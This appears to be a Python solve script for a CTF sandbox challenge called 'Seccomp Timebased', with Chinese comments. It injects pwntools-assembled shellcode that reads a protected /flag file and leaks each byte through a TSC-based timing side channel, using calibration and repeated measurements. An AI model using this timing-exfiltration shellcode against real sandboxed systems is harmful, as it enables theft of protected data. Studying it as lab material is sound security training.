# Seccomp Readonly
# Seccomp Timebased
import statistics
import time
from collections import Counter
import pwn
from dojotool import find_challenge

# 每个字符值对应的时间间隔。
# 同步计时后可以缩小，但建议至少保留 1ms。
SLEEP_STEP_NS = 3_000_000

# 这里是 TSC cycles，不是纳秒。
# 若虚拟机的 TSC 大约为 2～4 GHz，10,000,000 cycles
# 大约对应 2.5～5 ms。
DELAY_STEP_CYCLES = 10_000_000

# 每轮额外执行一次空载测量，用于消除发送、反汇编输出、
# seccomp 加载和进程终止的固定开销。
CALIBRATION_SAMPLES = 5

# 同一个结果累计出现多少次后确认。
REQUIRED_MATCHES = 3


def run_shellcode(root_bin: str, shellcode: bytes) -> int:
    with pwn.process([root_bin, "/flag"], raw=True, level="error") as io:
        io.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.\n")
        start = time.perf_counter_ns()
        io.send(shellcode)
        io.recvrepeat()
        return time.perf_counter_ns() - start


def calibrate(root_bin: str) -> int:
    samples = [run_shellcode(root_bin, pwn.asm("ret")) for _ in range(CALIBRATION_SAMPLES)]

    baseline_ns = int(statistics.median(samples))

    print(
        f"[+] baseline: {baseline_ns / 1_000_000:.3f} ms",
        flush=True,
    )

    return baseline_ns


def make_read_shellcode(index: int) -> bytes:
    # mmap 范围为 0x1337000 至 0x1337fff。
    flag_buffer = 0x1337800

    return pwn.asm(f"""
        /*
         * read(3, flag_buffer, index + 1)
         */
        mov edi, 3
        mov rsi, {flag_buffer}
        mov edx, {index + 1}
        xor eax, eax
        syscall

        /*
         * 读取不足表示 EOF。
         * EOF 分支不执行 nanosleep。
         */
        cmp rax, {index + 1}
        jl done

        /*
         * r9 = flag[index]
         */
        movzx r9d, byte ptr [{flag_buffer + index}]

        /*
         * 读取当前 TSC：
         *
         *   EDX:EAX = timestamp counter
         */
        rdtsc
        shl rdx, 32
        or rax, rdx

        /*
         * r8 = 当前 TSC + flag[index] * DELAY_STEP_CYCLES
         */
        imul r9, r9, {DELAY_STEP_CYCLES}
        add r9, rax
        mov r8, r9

    spin:
        rdtsc
        shl rdx, 32
        or rax, rdx

        cmp rax, r8
        jb spin

    done:
        ret
    """)


def one_round(
    root_bin: str,
    baseline_ns: int,
    step_ns: float,
    index: int,
) -> tuple[int, int]:
    shellcode = make_read_shellcode(index)
    elapsed_ns = run_shellcode(root_bin, shellcode)
    encoded_ns = elapsed_ns - baseline_ns

    value = round(encoded_ns / step_ns)
    return value, encoded_ns


def measure_step(root_bin: str, baseline_ns: int) -> float:
    """
    用一个已知延时系数测量 TSC cycles 到实际纳秒的换算。

    这里构造固定 64 单位的延时，然后除以 64。
    """
    known_value = 64

    shellcode = pwn.asm(f"""
        rdtsc
        shl rdx, 32
        or rax, rdx

        mov r8, rax
        add r8, {known_value * DELAY_STEP_CYCLES}

    spin:
        rdtsc
        shl rdx, 32
        or rax, rdx
        cmp rax, r8
        jb spin

        ret
    """)

    samples = []

    for _ in range(7):
        elapsed = run_shellcode(root_bin, shellcode)
        samples.append(elapsed - baseline_ns)

    encoded_ns = statistics.median(samples)
    step_ns = encoded_ns / known_value

    print(
        f"[+] measured step: {step_ns / 1_000_000:.3f} ms/value",
        flush=True,
    )

    return step_ns


def confirmed_round(
    root_bin: str,
    baseline_ns: int,
    step_ns: float,
    index: int,
) -> int:
    counts: Counter[int] = Counter()
    attempts = 0

    while True:
        attempts += 1

        value, encoded_ns = one_round(root_bin, baseline_ns, step_ns, index)
        counts[value] += 1
        count = counts[value]

        print(
            f"[{index:02d}] attempt {attempts}: "
            f"0x{value:02x} ({value!r}), "
            f"encoded={encoded_ns / 1_000_000:.3f} ms, "
            f"matches={count}/{REQUIRED_MATCHES}",
        )

        if count >= REQUIRED_MATCHES:
            return value


def ctf() -> None:
    root_bin = find_challenge()
    baseline_ns = calibrate(root_bin)
    step_ns = measure_step(root_bin, baseline_ns)

    flag = bytearray()

    for index in range(0x100):
        value = confirmed_round(root_bin, baseline_ns, step_ns, index)

        flag.append(value)

        print(
            f"[{index:02d}] 0x{value:02x} {flag.decode(errors='replace')}",
            flush=True,
        )

        if value == ord("}") or value == 0:
            break


if __name__ == "__main__":
    ctf()
